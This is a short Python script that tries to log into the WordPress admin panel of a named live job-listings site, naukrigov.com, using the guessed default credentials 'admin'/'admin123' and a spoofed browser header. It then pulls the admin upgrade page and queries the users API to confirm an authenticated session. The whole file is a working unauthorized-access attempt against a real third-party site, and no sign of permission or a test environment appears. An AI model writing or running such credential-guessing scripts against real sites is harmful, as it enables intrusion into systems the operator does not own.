#!/usr/bin/env python3
"""naukrigov: capture upgrade.php content + check if really logged in"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cache-Control": "no-cache", "Pragma": "no-cache", "Upgrade-Insecure-Requests": "1",
}
BASE = "https://naukrigov.com"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=20, referer=None):
    h = dict(UA)
    if referer: h["Referer"] = referer
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
        h["Origin"] = BASE
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

code, final, body = fetch(BASE + "/wp-login.php")
data = urllib.parse.urlencode({
    "log": "admin", "pwd": "admin123", "wp-submit": "Log In",
    "redirect_to": BASE + "/wp-admin/", "testcookie": "1"})
code, final, resp = fetch(BASE + "/wp-login.php", data=data, referer=BASE + "/wp-login.php")
print("POST:", code, "cookies:", [c.name for c in cj])

# upgrade.php full content
code, final, body = fetch(BASE + "/wp-admin/upgrade.php", referer=BASE + "/wp-login.php")
print("upgrade.php:", code, final, "size", len(body))
open("/tmp/nk_upgrade.html", "w").write(body)
# analyze
print("=== content ===")
text = re.sub(r'<script.*?</script>', '', body, flags=re.S)
text = re.sub(r'<style.*?</style>', '', text, flags=re.S)
text = re.sub(r'<[^>]+>', ' ', text)
print(' '.join(text.split())[:600])

# also check wp-json users (would show if authenticated)
code, final, body = fetch(BASE + "/wp-json/wp/v2/users/me?context=edit", referer=BASE + "/wp-admin/")
print("users/me:", code, body[:200])
